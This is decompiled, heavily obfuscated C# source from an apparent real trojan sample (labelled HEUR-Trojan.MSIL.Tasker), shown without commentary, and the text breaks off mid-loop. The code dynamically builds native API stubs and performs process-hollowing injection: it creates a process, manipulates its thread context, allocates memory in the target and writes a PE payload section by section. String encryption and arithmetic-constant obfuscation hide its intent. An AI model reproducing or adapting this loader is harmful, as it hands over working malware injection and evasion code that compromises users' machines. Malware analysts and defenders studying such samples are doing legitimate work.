// Decompiled with JetBrains decompiler
// Type: Get_DayNames
// Assembly: fecdjlmmFA, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9253BDD-5FA0-42F4-8B0E-70ACE2241470
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-2d4158772871be3f7e522bf37dfc01789234fceea5e08f3b779261cecd08c880.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

public static class Get_DayNames
{
  private static Get_DayNames.M_permSetSaved GetDataItem = Get_DayNames.ShortInlineI<Get_DayNames.M_permSetSaved>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("IP3INuhVz5+4NL/nCdYAQA==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("P0iKUEK6VVHsJq61nnc0scX5nys80U8u", "fecdjlmmFA"));
  private static Get_DayNames.S_userDefaultUICulture Waiters = Get_DayNames.ShortInlineI<Get_DayNames.S_userDefaultUICulture>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("IP3INuhVz5+4NL/nCdYAQA==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("lCNv7jti99C+1544UGbXNuqvaVl1WHsz", "fecdjlmmFA"));
  private static Get_DayNames.IsReadOnly set_NumberDecimalDigits = Get_DayNames.ShortInlineI<Get_DayNames.IsReadOnly>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("IP3INuhVz5+4NL/nCdYAQA==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("GFP3JepFhGwfGe0iLquDnl8CCJZAJUlO", "fecdjlmmFA"));
  private static Get_DayNames.ATTPresence Get_Datastore = Get_DayNames.ShortInlineI<Get_DayNames.ATTPresence>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("IP3INuhVz5+4NL/nCdYAQA==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("DQJWVkxz7fu4yEMLqRDt4g==", "fecdjlmmFA"));
  private static Get_DayNames.Branch GetMonthName = Get_DayNames.ShortInlineI<Get_DayNames.Branch>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("IP3INuhVz5+4NL/nCdYAQA==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("q1UZnVePR0AJI4+5uBEaQAzOxKMaC5eG", "fecdjlmmFA"));
  private static Get_DayNames.M_dataIndex Idn = Get_DayNames.ShortInlineI<Get_DayNames.M_dataIndex>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("IP3INuhVz5+4NL/nCdYAQA==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("TDSRej9PbwFCZzzWE8iLhcdMSviAUQgV", "fecdjlmmFA"));
  private static Get_DayNames.Action`3 RestrictedMemberAccess = Get_DayNames.ShortInlineI<Get_DayNames.Action`3>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("IP3INuhVz5+4NL/nCdYAQA==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("MLUatIKa2MdAE54R8ekTLqMmEk0X/Vtr", "fecdjlmmFA"));
  private static Get_DayNames._includeDirs MaxTicks = Get_DayNames.ShortInlineI<Get_DayNames._includeDirs>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("IP3INuhVz5+4NL/nCdYAQA==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("KvEpCAzuWGOavKDROIzDeA==", "fecdjlmmFA"));
  private static Get_DayNames.Methods GregorianCalendarHelper = Get_DayNames.ShortInlineI<Get_DayNames.Methods>(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("EEjlf9tWWKvvGagxDfg//Q==", "fecdjlmmFA"), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("d8hrAZLlJE3Sg2yP1izLODZyjo0Tjv8W", "fecdjlmmFA"));

  public static \u0001 ShortInlineI<\u0001>(string _param0_1, string _param1)
  {
    AssemblyBuilder assemblyBuilder = (AssemblyBuilder) \u003CModule\u003E.krî\u00B87(\u003CModule\u003E.jA\u009C\u00B2\u0098(), \u003CModule\u003E.DNÜ\u0093\u002A(\u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("BLwqr6S6ovTbbO541H90B8UOw+ytQLOM", "fecdjlmmFA")), (AssemblyBuilderAccess) ((int.Parse("-2141974123") ^ int.Parse("2141880311")) + Convert.ToInt32(11366.0 + Math.Ceiling(11366.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) + Convert.ToInt32(80283.103723103792 - Math.Sqrt(40041.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("14"))));
    ModuleBuilder moduleBuilder = (ModuleBuilder) \u003CModule\u003E.\u0030ã\u0095ãñ((object) assemblyBuilder, \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("BLwqr6S6ovRYPnEfFojYpJYkxAl6WSDm", "fecdjlmmFA"));
    TypeBuilder typeBuilder = (TypeBuilder) \u003CModule\u003E.\u00BEï\u0013ÿÙ((object) moduleBuilder, "DynamicDllInvokeType", (TypeAttributes) ((Convert.ToInt32(-2845.5 - 2845.5) + Convert.ToInt32(16713.990703970725 - Math.Cos(8356.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) + Convert.ToInt32(81772.5 - Math.Abs(27257.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("8"))) * (Convert.ToInt32(-17834.5 - 17834.5) + Convert.ToInt32(14796.130768280269 + Math.Log10(7400.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) + Convert.ToInt32(20874.93312696807 + Math.Tan(10435.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")))));
    // ISSUE: type reference
    MethodInfo methodInfo1 = (MethodInfo) \u003CModule\u003E.Ïôö\u0082ô(\u003CModule\u003E.MæaeQ(__typeref (\u0001)), \u003CModule\u003E.\u00B9\u00B1\u0099\u0008Ü("oZ7/GQsq5Fo=", "fecdjlmmFA"));
    Type[] array = ((IEnumerable<ParameterInfo>) \u003CModule\u003E.Oµ\u005D\u00AD\u00A5((object) methodInfo1)).Select<ParameterInfo, Type>((Func<ParameterInfo, Type>) (_param0_2 => (Type) \u003CModule\u003E.\u00BC\u002DJ\u009C\u009D((object) _param0_2))).ToArray<Type>();
    MethodBuilder methodBuilder = (MethodBuilder) \u003CModule\u003E.Ö\u001D\u0081\u009F\u00AF((object) typeBuilder, _param1, _param0_1, (MethodAttributes) ((Convert.ToInt32(2.0 * 16943.5) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) + Convert.ToInt32(186.0 + Math.Truncate(186.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) - Convert.ToInt32(339171012.5 / 13022.5) / \u003CModule\u003E.GREGORIAN(int.Parse("1"))) * ((int.Parse("1069648122") ^ int.Parse("1069625149")) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) + Convert.ToInt32(2046.4000681972009 - Math.Cos(1023.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) - Convert.ToInt32(67494.0 - Math.Floor(22498.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")))), (CallingConventions) (Convert.ToInt32(2.0 * -105.5) + Convert.ToInt32(70558.3369424603 - Math.Tan(35279.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("3")) - Convert.ToInt32(2474350204.5 / 35173.5) / \u003CModule\u003E.GREGORIAN(int.Parse("13"))), \u003CModule\u003E.e\u00BC\u001BAø((object) methodInfo1), array, (CallingConvention) (Convert.ToInt32(2.0 * -49257.0) + Convert.ToInt32(10885.0 + 10885.0) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) + Convert.ToInt32(76749.584020094757 - Math.Log10(38372.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("14"))), (CharSet) ((Convert.ToInt32(8305.0 + 8305.0) / \u003CModule\u003E.GREGORIAN(int.Parse("2")) + Convert.ToInt32(64045.243605831653 + Math.Sin(32022.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) - Convert.ToInt32(40327.0 + Math.Round(40326.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6"))) * (Convert.ToInt32(300223008.0 / -12252.0) + Convert.ToInt32(75880.966669515183 + Math.Sqrt(38038.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) - Convert.ToInt32(51571.638463817908 + Math.Sin(25785.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("7")))));
    \u003CModule\u003E.ê_YN\u005E((object) methodBuilder, \u003CModule\u003E.\u0086\u000B\u003C\u0012M((object) methodBuilder) | (MethodImplAttributes) ((Convert.ToInt32(-47750.0 - 47750.0) + Convert.ToInt32(12252.0 + Math.Tanh(6126.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) + Convert.ToInt32(41688.0 + Math.Truncate(41687.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("13"))) * (Convert.ToInt32(-164283.0 - -54761.0) + Convert.ToInt32(12280.0 + Math.Round(12280.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("3")) + Convert.ToInt32(127445.0 - Math.Ceiling(42481.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("8")))));
    Type type = (Type) \u003CModule\u003E.ù\u003BFr\u0022((object) typeBuilder);
    MethodInfo methodInfo2 = (MethodInfo) \u003CModule\u003E.\u0015\u00AB\u0001Ø\u000D((object) type, _param1);
    // ISSUE: type reference
    return (\u0001) \u003CModule\u003E.\u00BB\u00B6\u002EôG((Type) \u003CModule\u003E.MæaeQ(__typeref (\u0001)), methodInfo2, Convert.ToInt32(-52648.5 - 52648.5) + Convert.ToInt32(2.0 * 24421.0) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) + Convert.ToInt32(2.0 * 28228.0) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) != 0);
  }

  public static bool PreserveEventRids(
    string _param0,
    string _param1,
    byte[] _param2,
    bool _param3)
  {
    for (int index = (int.Parse("1061269392") ^ int.Parse("1061204095")) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) + Convert.ToInt32(603.0 + Math.Ceiling(603.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) - Convert.ToInt32(112374.0 - 37458.0) / \u003CModule\u003E.GREGORIAN(int.Parse("4")); index <= (Convert.ToInt32(4576948488.0 / -47838.0) + Convert.ToInt32(5064.4032063416444 - Math.Log10(2530.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) + Convert.ToInt32(90619.071318155155 + Math.Sin(45310.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("2"))) * (Convert.ToInt32(-45991.0 - 45991.0) + Convert.ToInt32(52493.740947864222 + Math.Sqrt(26328.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) + Convert.ToInt32(39328.0 - Math.Tanh(19663.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("13"))); index += (int.Parse("-1616436223") ^ int.Parse("1616534254")) + Convert.ToInt32(70798.966027188144 + Math.Sin(35399.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) + Convert.ToInt32(139972.0 - Math.Truncate(46657.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")))
    {
      if (\u003CModule\u003E.\u005D\u0098ëgs(_param0, _param1, _param2, _param3))
        return Convert.ToInt32(-33097.5 - -11032.5) + Convert.ToInt32(2.0 * 30001.0) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) - Convert.ToInt32(56904.0 - Math.Truncate(18968.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) != 0;
    }
    return Convert.ToInt32(7158061250.0 / -59825.0) + Convert.ToInt32(89421.602512853875 + Math.Sin(44710.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("13")) + Convert.ToInt32(45343.5 - Math.Abs(15114.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length != 0;
  }

  public static bool M_strDescription(
    string _param0,
    string _param1,
    byte[] _param2,
    bool _param3)
  {
    int lpNumberOfBytesWritten = Convert.ToInt32(380548872.0 / -13794.0) + Convert.ToInt32(50969.389460128332 - Math.Sqrt(25405.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) - Convert.ToInt32(23212.640291796371 + Math.Log(11611.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length;
    string lpCommandLine = \u003CModule\u003E.øEÿ\u0096\u001E("\"", _param0, "\"");
    Get_DayNames.First startupInfo = new Get_DayNames.First();
    Get_DayNames.TypeCacheQueue hmmmoddcjSc = new Get_DayNames.TypeCacheQueue();
    // ISSUE: type reference
    startupInfo.IsEnabled = \u003CModule\u003E.\u000F\u009C\u009D\u00A8\u000A(\u003CModule\u003E.uRVyâ((Type) \u003CModule\u003E.MæaeQ(__typeref (Get_DayNames.First))));
    try
    {
      if (!\u003CModule\u003E.\u005CªkÓÓ(_param1))
        lpCommandLine = \u003CModule\u003E.øEÿ\u0096\u001E(lpCommandLine, " ", _param1);
      if (!Get_DayNames.GregorianCalendarHelper(IntPtr.Zero, _param0, lpCommandLine, IntPtr.Zero, IntPtr.Zero, Convert.ToInt32(-31088.0 - 31088.0) + Convert.ToInt32(51966.0 - Math.Floor(17322.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("2")) + Convert.ToInt32(27531.505786092162 - Math.Tan(13766.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) - Type.EmptyTypes.Length + Type.EmptyTypes.Length != 0, (uint) (((int.Parse("-71836181") ^ int.Parse("71869483")) + Convert.ToInt32(17135.0 - Math.Ceiling(5711.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) + Convert.ToInt32(11475.0 + Math.Round(11474.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("8"))) * (Convert.ToInt32(2.0 * -21249.5) + Convert.ToInt32(90968.0 + Math.Tanh(45484.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("2")) - (int.Parse("1904632862") ^ int.Parse("1904662859")) / \u003CModule\u003E.GREGORIAN(int.Parse("14")))), IntPtr.Zero, (string) null, ref startupInfo, ref hmmmoddcjSc))
        throw \u003CModule\u003E.\u00BBÎP\u0089ä();
      int num1 = \u003CModule\u003E.j\u0097\u00ACôc(_param2, (Convert.ToInt32(-158112.0 - -52704.0) + Convert.ToInt32(2.0 * 25284.0) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) + Convert.ToInt32(54889.779878553061 + Math.Log(27450.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))) * (Convert.ToInt32(10971544712.0 / -74066.0) + Convert.ToInt32(61216.962784670424 + Math.Sin(30608.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) + Convert.ToInt32(87124.465824537256 - Math.Sqrt(43458.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("3"))));
      int num2 = \u003CModule\u003E.j\u0097\u00ACôc(_param2, num1 + (Convert.ToInt32(-18639.0 - 18639.0) + Convert.ToInt32(62580.027993275005 + Math.Cos(31290.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) - Convert.ToInt32(25252.0 - Math.Tanh(12625.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))) * (Convert.ToInt32(16097383020.5 / -89714.5) + Convert.ToInt32(41516.0 + 41516.0) / \u003CModule\u003E.GREGORIAN(int.Parse("7")) + Convert.ToInt32(48199.0 + 48199.0) / \u003CModule\u003E.GREGORIAN(int.Parse("2"))));
      int[] context = new int[(Convert.ToInt32(88932.0 - Math.Round(29644.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) + Convert.ToInt32(9061.0 + Math.Ceiling(9061.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("7")) - Convert.ToInt32(77221.438578022658 + Math.Log(38616.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("13"))) * (Convert.ToInt32(-43568.5 - 43568.5) + Convert.ToInt32(64710.0 - Math.Truncate(21570.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) + Convert.ToInt32(65997.0 - Math.Truncate(21999.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("4")))];
      context[Convert.ToInt32(-84004.0 - 84004.0) + Convert.ToInt32(99025.26448209284 - Math.Sqrt(49401.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) + Convert.ToInt32(2.0 * 34602.5) / \u003CModule\u003E.GREGORIAN(int.Parse("2")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length] = (Convert.ToInt32(46764.069170663024 - Math.Cos(23382.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) + Convert.ToInt32(53965.802512594171 + Math.Cos(26982.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) - Convert.ToInt32(17596.0 + Math.Abs(17596.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("4"))) * (Convert.ToInt32(58811.26910586618 + Math.Sqrt(29491.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) + Convert.ToInt32(4877.5 + 4877.5) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) - Convert.ToInt32(103105.5 - Math.Abs(34368.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("2")));
      if (\u003CModule\u003E.U\u0085w\u009A\u00B7() != (Convert.ToInt32(-140929.5 - -46976.5) + Convert.ToInt32(12263.720542115403 - Math.Log(6127.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) + Convert.ToInt32(40851.0 + Math.Abs(40851.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("12"))) * (Convert.ToInt32(-38196.0 - -12732.0) + Convert.ToInt32(2.0 * 8477.5) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) + Convert.ToInt32(4255.0 + Math.Round(4255.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("1"))))
      {
        int num3 = Get_DayNames.GetDataItem(hmmmoddcjSc.IsHeldByCurrentThread, context) ? 1 : 0;
      }
      else
      {
        int num4 = Get_DayNames.Waiters(hmmmoddcjSc.IsHeldByCurrentThread, context) ? 1 : 0;
      }
      int num5 = context[(Convert.ToInt32(2.0 * -59500.5) + Convert.ToInt32(20947.5 + Math.Abs(20947.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) + (int.Parse("537378719") ^ int.Parse("537301700")) / \u003CModule\u003E.GREGORIAN(int.Parse("4"))) * (Convert.ToInt32(-4078.5 - 4078.5) + Convert.ToInt32(67786.0 + Math.Tanh(33893.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) - Convert.ToInt32(89443.5 - Math.Abs(29814.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("1")))];
      int lpBuffer1 = (int.Parse("-63896623") ^ int.Parse("63762262")) + Convert.ToInt32(63558.502112893977 - Math.Log10(31777.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("2")) + Convert.ToInt32(36252.0 + Math.Truncate(36251.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("13")) + Type.EmptyTypes.Length - Type.EmptyTypes.Length;
      int num6 = Get_DayNames.set_NumberDecimalDigits(hmmmoddcjSc._index, num5 + (Convert.ToInt32(71441.53887054541 + Math.Cos(35721.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) + Convert.ToInt32(12736.0 + 12736.0) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) - Convert.ToInt32(96685.879578412176 + Math.Sqrt(48453.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("3"))) * (Convert.ToInt32(2620.1751070849605 - Math.Log(1306.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) + Convert.ToInt32(9406.0357899310038 + Math.Sin(4703.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) - Convert.ToInt32(6009.0 + Math.Round(6009.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("6"))), lpBuffer1, (Convert.ToInt32(54877.5 - Math.Abs(18292.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) + Convert.ToInt32(33328.0 + Math.Tanh(16664.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("2")) - Convert.ToInt32(34955.0 + Math.Ceiling(34955.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11"))) * (Convert.ToInt32(27903.0 - Math.Round(9301.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) + Convert.ToInt32(59555.085861202439 - Math.Cos(29777.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) - Convert.ToInt32(117234.0 - Math.Ceiling(39078.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("2"))), ref lpNumberOfBytesWritten) ? 1 : 0;
      int dwSize = \u003CModule\u003E.j\u0097\u00ACôc(_param2, num1 + (Convert.ToInt32(-75623.5 - 75623.5) + Convert.ToInt32(33842.0 + Math.Round(33842.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) + Convert.ToInt32(41822.0 + Math.Floor(41821.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6"))) * (Convert.ToInt32(-70462.5 - 70462.5) + Convert.ToInt32(47455.099254099339 - Math.Cos(23728.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("2")) + Convert.ToInt32(93474.669642247027 - Math.Log10(46735.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))));
      int nSize = \u003CModule\u003E.j\u0097\u00ACôc(_param2, num1 + (Convert.ToInt32(932990404.5 / -21598.5) + Convert.ToInt32(34066.781239454227 - Math.Tan(17033.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) + Convert.ToInt32(42448898.0 / 4607.0) / \u003CModule\u003E.GREGORIAN(int.Parse("14"))) * (Convert.ToInt32(997481112.5 / -22332.5) + Convert.ToInt32(2.0 * 8929.0) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) + Convert.ToInt32(26809.0 - Math.Tanh(13404.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))));
      bool flag = Convert.ToInt32(-182406.0 - -60802.0) + Convert.ToInt32(118096.0 - Math.Truncate(39365.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) + Convert.ToInt32(21437.0 + Math.Floor(21436.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length != 0;
      int lpBaseAddress = Get_DayNames.Get_Datastore(hmmmoddcjSc._index, \u003CModule\u003E.\u00ABñfOz(num2), (uint) dwSize, (uint) ((Convert.ToInt32(568822720.5 / 16864.5) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) + Convert.ToInt32(79251.0 - Math.Ceiling(26417.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) - Convert.ToInt32(2.0 * 37137.5) / \u003CModule\u003E.GREGORIAN(int.Parse("12"))) * (Convert.ToInt32(15970.0 + Math.Floor(15969.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) + (int.Parse("1941613204") ^ int.Parse("1941628915")) / \u003CModule\u003E.GREGORIAN(int.Parse("7")) - Convert.ToInt32(51748.587094465773 + Math.Log10(25876.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")))), (uint) ((Convert.ToInt32(2.0 * 4382.0) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) + Convert.ToInt32(33411.5 + 33411.5) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) - Convert.ToInt32(75523.903171150814 - Math.Cos(37761.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("1"))) * (Convert.ToInt32(8264093922.0 / -64281.0) + Convert.ToInt32(42044.322632711694 - Math.Log10(21020.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) + Convert.ToInt32(86522.802934576466 - Math.Cos(43261.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")))));
      if (!_param3 && lpBaseAddress == 0)
      {
        flag = Convert.ToInt32(2.0 * -48012.5) + Convert.ToInt32(47562.0 + 47562.0) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) + Convert.ToInt32(901.81953990117438 + Math.Cos(451.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) != 0;
        lpBaseAddress = Get_DayNames.Get_Datastore(hmmmoddcjSc._index, \u003CModule\u003E.\u00ABñfOz(Convert.ToInt32(2873957112.5 / -37907.5) + Convert.ToInt32(85798.0 - Math.Floor(28599.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) + Convert.ToInt32(27924.0 - Math.Round(9308.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) - Type.EmptyTypes.Length + Type.EmptyTypes.Length), (uint) dwSize, (uint) ((Convert.ToInt32(2.0 * -16073.5) + Convert.ToInt32(21610.0 + Math.Floor(21610.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) + Convert.ToInt32(1822.0 - Math.Floor(607.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("11"))) * (Convert.ToInt32(2.0 * -9994.0) + Convert.ToInt32(16665.0 + 16665.0) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) - Convert.ToInt32(2.0 * 6670.5) / \u003CModule\u003E.GREGORIAN(int.Parse("7")))), (uint) ((Convert.ToInt32(15955.0 + Math.Ceiling(15955.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) + Convert.ToInt32(44209.655470188758 + Math.Log10(22107.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) - Convert.ToInt32(76081.036301764339 - Math.Tan(38030.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("1"))) * (Convert.ToInt32(4743.0 - Math.Tanh(2371.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) + Convert.ToInt32(82252.5 - 27417.5) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) - Convert.ToInt32(59748.5920044498 - Math.Sqrt(29788.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")))));
      }
      if (lpBaseAddress == 0)
        throw \u003CModule\u003E.\u00BBÎP\u0089ä();
      int num7 = Get_DayNames.GetMonthName(hmmmoddcjSc._index, lpBaseAddress, _param2, nSize, out lpNumberOfBytesWritten) ? 1 : 0;
      int num8 = num1 + (Convert.ToInt32(-34130.5 - 34130.5) + Convert.ToInt32(45529.5 + 45529.5) / \u003CModule\u003E.GREGORIAN(int.Parse("3")) - Convert.ToInt32(22550.175125989463 - Math.Sin(11275.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))) * (Convert.ToInt32(-66720.0 - 66720.0) + Convert.ToInt32(2.0 * 33712.0) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) + Convert.ToInt32(33008.0 + Math.Ceiling(33008.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("3")));
      short num9 = \u003CModule\u003E.î\u0029ÅØÙ(_param2, num1 + (Convert.ToInt32(2.0 * -16661.5) + Convert.ToInt32(77364.0 - 25788.0) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) - Convert.ToInt32(9123.5 + Math.Abs(9123.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))) * (Convert.ToInt32(1119070740.5 / -23654.5) + Convert.ToInt32(75601.173891138838 - Math.Sqrt(37703.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("3")) - Convert.ToInt32(42145.0 - Math.Floor(14048.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("12"))));
      int num10 = Convert.ToInt32(9309.5 + 9309.5) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) + Convert.ToInt32(34538.944470529852 + Math.Cos(17269.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) - Convert.ToInt32(79735.5 - 26578.5) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) - Type.EmptyTypes.Length + Type.EmptyTypes.Length;
      do
      {
        int num11 = \u003CModule\u003E.j\u0097\u00ACôc(_param2, num8 + ((int.Parse("-792917217") ^ int.Parse("792869961")) + Convert.ToInt32(9586.0 + Math.Ceiling(9586.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) + Convert.ToInt32(48315.0 - Math.Round(16105.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("13"))) * (Convert.ToInt32(55112.979962304 + Math.Cos(27556.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) + Convert.ToInt32(10607.5 + 10607.5) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) - Convert.ToInt32(76327.843217422967 - Math.Cos(38163.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("3"))));
        int length = \u003CModule\u003E.j\u0097\u00ACôc(_param2, num8 + (Convert.ToInt32(-2055.0 - 2055.0) + Convert.ToInt32(42285.0 - Math.Floor(14095.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) - Convert.ToInt32(24073.395325046189 - Math.Log(12032.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11"))) * ((int.Parse("-1765172699") ^ int.Parse("1765151461")) + Convert.ToInt32(18680.97027712312 - Math.Log10(9338.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) + Convert.ToInt32(17778.0 - Math.Ceiling(5926.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))));
